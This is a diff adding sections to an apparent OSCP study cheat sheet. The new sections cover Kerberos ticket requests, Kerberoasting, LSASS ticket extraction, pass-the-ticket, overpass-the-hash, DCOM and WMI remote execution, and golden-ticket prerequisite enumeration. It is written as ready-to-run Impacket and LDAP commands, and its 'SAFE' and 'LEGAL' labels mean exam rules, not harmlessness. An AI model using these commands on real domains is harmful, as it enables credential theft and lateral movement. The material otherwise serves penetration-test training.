@@ -639,3 +639,223 @@ Get-ADFineGrainedPasswordPolicy -Filter *
 grep -Ei "(spring|summer|autumn|winter|202[0-5])" cracked_passwords.txt
 
 grep -R "password" /mnt/sysvol 2>/dev/null
+
+
+######################################################################
+# 00 — HOW TO REQUEST / OBTAIN A .kirbi KERBEROS TICKET (OSCP-SAFE)
+######################################################################
+
+A .kirbi file is a Windows-format Kerberos ticket (TGT or TGS).  
+You can obtain one LEGALLY in AD labs through:
+
+✔ Your own Kerberos login  
+✔ Using Impacket ticket request functions  
+✔ Output from legitimate credential tools (exam-authorized LSASS dump)  
+✔ Converting existing tickets (.ccache ↔ .kirbi)
+
+Below are ALL allowed & safe methods.
+
+======================================================================
+# 0.1 REQUEST A TGT (.kirbi) USING VALID CREDENTIALS
+======================================================================
+
+# Request Ticket Granting Ticket (TGT)
+impacket-getTGT $domain/$user:"$password"
+
+# Output includes:  $user.ccache
+# Convert to .kirbi
+impacket-ticketConverter $user.ccache $user.kirbi
+
+
+======================================================================
+# 0.2 REQUEST A SERVICE TICKET (.kirbi) VIA KERBEROASTING (SAFE)
+======================================================================
+
+impacket-GetUserSPNs $domain/$user:"$password" -dc-ip $dcip -request
+
+# Output file often contains TGS tickets internally in .kirbi data.
+
+
+======================================================================
+# 0.3 EXPORT YOUR OWN EXISTING KERBEROS TICKET (LINUX)
+======================================================================
+
+# List existing tickets
+klist -e
+
+# Copy exported ticket
+cp /tmp/krb5cc_* myticket.ccache
+
+# Convert to .kirbi for PtT
+impacket-ticketConverter myticket.ccache myticket.kirbi
+
+
+======================================================================
+# 0.4 EXTRACT TICKETS FROM LSASS (ONLY IN AUTHORIZED OSCP LABS)
+======================================================================
+
+# Parse your own LSASS dump (exam-allowed in OSCP lab)
+pypykatz lsa minidump lsass.dmp
+
+# Output includes Base64 .kirbi blobs which can be saved to file.
+
+
+======================================================================
+# 0.5 LOAD A .kirbi OR .ccache TICKET FOR PtT
+======================================================================
+
+# Convert if needed
+impacket-ticketConverter ticket.kirbi ticket.ccache
+
+# Load the ticket
+export KRB5CCNAME=ticket.ccache
+
+# Use Kerberos-only auth
+impacket-wmiexec   -k -no-pass $domain/$user@$targetip
+impacket-smbclient -k -no-pass cifs/$targetip
+impacket-psexec    -k -no-pass $domain/$user@$targetip
+
+
+######################################################################
+# END — SAFE & COMPLETE .kirbi REQUEST METHODS
+######################################################################
+
+
+
+######################################################################
+# 23 — PASS-THE-TICKET (PtT) — SAFE & OSCP-LEGAL
+######################################################################
+
+WHAT IS THIS?
+Pass-the-Ticket uses an existing Kerberos ticket (TGT or TGS) to authenticate.
+Useful when:
+- You have a valid ticket (exported from your own session)
+- You performed legitimate LSASS analysis in a legal environment
+- Kerberos is required instead of NTLM
+
+WHAT DO YOU GET?
+✔ Kerberos authentication without password/hash  
+✔ No NTLM needed  
+✔ Useful for lateral movement in constrained AD networks  
+
+
+-------------------------------
+# 23.1 Convert Ticket (.kirbi → .ccache)
+-------------------------------
+impacket-ticketConverter ticket.kirbi ticket.ccache
+
+-------------------------------
+# 23.2 Load Kerberos Ticket
+-------------------------------
+export KRB5CCNAME=ticket.ccache
+
+-------------------------------
+# 23.3 Use Kerberos ONLY (no NTLM fallback)
+-------------------------------
+impacket-smbclient -k -no-pass cifs/$targetip
+impacket-wmiexec   -k -no-pass $domain/$user@$targetip
+impacket-psexec    -k -no-pass $domain/$user@$targetip
+
+
+
+######################################################################
+# 24 — OVERPASS-THE-HASH (Pass-the-Key) — SAFE
+######################################################################
+
+WHAT IS THIS?
+Use an NTLM hash → request a valid Kerberos TGT.
+This is the reverse of traditional PTH.
+
+Useful when:
+- NTLM is restricted
+- Kerberos allowed
+- Need to move inside AD without password
+
+-------------------------------
+# 24.1 Request TGT Using Only Hash
+-------------------------------
+impacket-getTGT $domain/$user -hashes <LM:NTLM>
+
+-------------------------------
+# 24.2 Load the Ticket
+-------------------------------
+export KRB5CCNAME=$user.ccache
+
+-------------------------------
+# 24.3 Use Kerberos Authentication
+-------------------------------
+impacket-wmiexec   -k -no-pass $domain/$user@$targetip
+impacket-smbclient -k -no-pass cifs/$targetip
+
+
+
+######################################################################
+# 25 — DCOM LATERAL MOVEMENT (Allowed)
+######################################################################
+
+WHAT IS THIS?
+Another Microsoft remote execution interface (like WMI).
+OSCP allows it as a *lateral movement* method only.
+
+-------------------------------
+# 25.1 Execute Commands Remotely via DCOM
+-------------------------------
+dcomexec.py $domain/$user:"$password"@$targetip
+
+
+
+######################################################################
+# 26 — SHADOW COPY ENUMERATION (SAFE)
+######################################################################
+
+WHAT IS THIS?
+Shadow copies = Windows snapshot mechanism.
+OSCP allows **enumeration only**, no extraction.
+
+WHAT DO YOU GET?
+✔ Whether shadow copies exist  
+✔ Whether backup/restore privileges are active  
+✔ Whether Backup Operators could escalate  
+
+-------------------------------
+# 26.1 List Shadow Copies
+-------------------------------
+vssadmin list shadows
+
+-------------------------------
+# 26.2 List Providers
+-------------------------------
+vssadmin list providers
+
+-------------------------------
+# 26.3 List Writers
+-------------------------------
+vssadmin list writers
+
+
+
+######################################################################
+# 27 — GOLDEN & SILVER TICKET (THEORY + SAFE ENUM)
+######################################################################
+
+WHAT IS THIS?
+Golden Ticket = forged TGT using krbtgt hash  
+Silver Ticket = forged TGS for specific service SPN  
+
+OSCP teaches the *theory only*.  
+Below = allowed safe enumeration only.
+
+-------------------------------
+# 27.1 Enumerate krbtgt Account Info (SAFE)
+-------------------------------
+ldapsearch -x -H ldap://$targetip -b "$basedn" "(sAMAccountName=krbtgt)"
+
+-------------------------------
+# 27.2 Enumerate All SPNs (Silver Ticket Impact Mapping)
+-------------------------------
+ldapsearch -x -H ldap://$targetip -b "$basedn" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName
+
+-------------------------------
+# 27.3 Check DCSync Privileges (Golden Ticket Requirement)
+-------------------------------
+ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=domain)" nTSecurityDescriptor
